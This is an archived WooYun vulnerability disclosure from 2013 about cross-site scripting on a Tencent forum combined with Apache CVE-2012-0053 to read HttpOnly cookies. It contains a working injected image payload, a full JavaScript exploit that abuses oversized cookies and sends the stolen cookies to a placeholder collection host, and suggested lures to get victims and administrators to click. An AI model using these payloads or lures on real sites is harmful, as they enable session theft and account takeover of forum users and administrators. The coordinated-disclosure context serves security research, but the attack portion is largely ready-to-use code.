@@ -1,0 +1,268 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯某论坛XSS攻击，获取httponly  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯某论坛XSS攻击，获取httponly  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/酱油甲">酱油甲</a> 
+</li><li>提交时间：		2013-03-24 18:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-14：	细节向普通白帽子公开<br/>
+									2013-04-24：	细节向实习白帽子公开<br/>
+									2013-05-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">貌似DZ那边经常忽略啊，就来这边提交吧，反正也是腾讯的论坛<br />
+腾讯某DZ论坛XSS攻击，获取httponly</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://bbs.open.qq.com/<br />
+<br />
+是APACHE服务器，由于存在CVE-2012-0053，再加上一个小小的跨站，即可获取HTTPONLY的COOKIE<br />
+<br />
+测试环境：win7+火狐浏览器19<br />
+<br />
+<br />
+<br />
+简单说下<br />
+<br />
+1.这个论坛是APACHE服务器上的，存在CVE-2012-0053，这东西能突破HTTPONLY，你们肯定知道<br />
+<br />
+于是我们来到任何地方，发个图片，然后在介绍里面写入：<br />
+<br />
+</p><pre><code>&lt;img src=x onerror=s=createElement(&#039;script&#039;);body.appendChild(s);s.src=&#039;http://t.cn/z12345G&#039;;&gt;</code></pre><p class='detail'><br />
+<br />
+DZ限制了长度，利用短域名，再加上上面这串代码刚好可以嵌入<br />
+<br />
+</p><p class="detail"><a href="../images/241744182568c919219ed2a38dc0b752ec81b4d3.jpg" target="_blank"><img src="../images/241744182568c919219ed2a38dc0b752ec81b4d3.jpg" alt="0.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/241806366a568bad8823341c71493aa7babf288d.jpg" target="_blank"><img src="../images/241806366a568bad8823341c71493aa7babf288d.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+这个位置需要点击才能触发跨站（这个洞洞记得有人提交过了，忘记您名字了……不好意思……不过不是本文重点，不做讨论），如何让别人点图片呢？<br />
+<br />
+ 图片写个：点击送Q币   ？  怎么样？<br />
+<br />
+</p><p class="detail"><a href="../images/24180355514a816d0f8d829c04ff4a3cf5ab4bbc.jpg" target="_blank"><img src="../images/24180355514a816d0f8d829c04ff4a3cf5ab4bbc.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2.DZ X2.5的AUTH是HTTPONLY的，所以DZ经常无视XSS漏洞吧？但是由于APACHE的漏洞，我们就能突破这个HTTPONLY<br />
+<br />
+</p><p class="detail"><a href="../images/24175650e1ff39c53219336d9f6c73f9274a9bdc.jpg" target="_blank"><img src="../images/24175650e1ff39c53219336d9f6c73f9274a9bdc.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+例如下面这个JS（写的不好请见谅……）<br />
+<br />
+</p><pre><code>makeRequest();<br />
+    function setCookies (good) {<br />
+        var str = &quot;&quot;;<br />
+        for (var i=0; i&lt; 819; i++) {<br />
+            str += &quot;x&quot;;<br />
+        }<br />
+        for (i = 0; i &lt; 10; i++) {<br />
+            if (good) {<br />
+                var cookie = &quot;xss&quot;+i+&quot;=;expires=&quot;+new Date(+new Date()-1).<br />
+                  toUTCString()+&quot;; path=/;&quot;;<br />
+            }<br />
+            else {<br />
+                var cookie = &quot;xss&quot;+i+&quot;=&quot;+str+&quot;;path=/&quot;;<br />
+            }<br />
+            document.cookie = cookie;<br />
+        }<br />
+    }<br />
+<br />
+    function makeRequest() {<br />
+        setCookies();<br />
+        function parseCookies () {<br />
+            var cookie_dict = {};<br />
+            if (xhr.readyState === 4 &amp;&amp; xhr.status === 400) {<br />
+                var content = xhr.responseText.replace(/\r|\n/g,&#039;&#039;).match<br />
+                   (/&lt;pre&gt;(.+)&lt;\/pre&gt;/);<br />
+                if (content.length) {<br />
+                    content = content[1].replace(&quot;Cookie: &quot;, &quot;&quot;);<br />
+                    var cookies = content.replace(/xss\d=x+;?/g, &#039;&#039;).split(/;/g);<br />
+                   <br />
+                    for (var i=0; i&lt;cookies.length; i++) {<br />
+                        var s_c = cookies[i].split(&#039;=&#039;,2);<br />
+                        cookie_dict[s_c[0]] = s_c[1];<br />
+                    }<br />
+                }<br />
+                setCookies(true);<br />
+                var x=new Image();<br />
+                try<br />
+                {<br />
+                    var myopener=&#039;&#039;;<br />
+                    myopener=window.opener &amp;&amp; window.opener.location?window.opener.location:&#039;&#039;;<br />
+                }<br />
+                catch(err)<br />
+                {<br />
+                }<br />
+                x.src=&#039;http://www.xxxx.com/save.php?cookie=&#039;+encodeURIComponent(JSON.stringify(cookie_dict));<br />
+            }<br />
+        }<br />
+        var xhr = new XMLHttpRequest();<br />
+        xhr.onreadystatechange = parseCookies;<br />
+        xhr.open(&quot;GET&quot;, &quot;httponly.php&quot;, true);<br />
+        xhr.send(null);<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+3.然后我们来看下获取的信息，可爱的auth被爆出来了不是么~~<br />
+<br />
+</p><p class="detail"><a href="../images/2418002465e0480b84d881139232fdbf3ee1889c.jpg" target="_blank"><img src="../images/2418002465e0480b84d881139232fdbf3ee1889c.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4.更大的用途，怎么诱惑管理员来点呢？<br />
+<br />
+这个自由发挥吧，我只在自己的内网测了下，确实是可以通过这个COOKIE登陆后台的<br />
+<br />
+但是需要管理员先登陆过后台并且还要改下请求头才行~~ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/2418002465e0480b84d881139232fdbf3ee1889c.jpg" target="_blank"><img src="../images/2418002465e0480b84d881139232fdbf3ee1889c.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们比我懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/酱油甲" title="酱油甲">酱油甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020583" title="腾讯某论坛XSS攻击，获取httponly">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2013-03-25 17:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢反馈，已在处理中。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20583";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
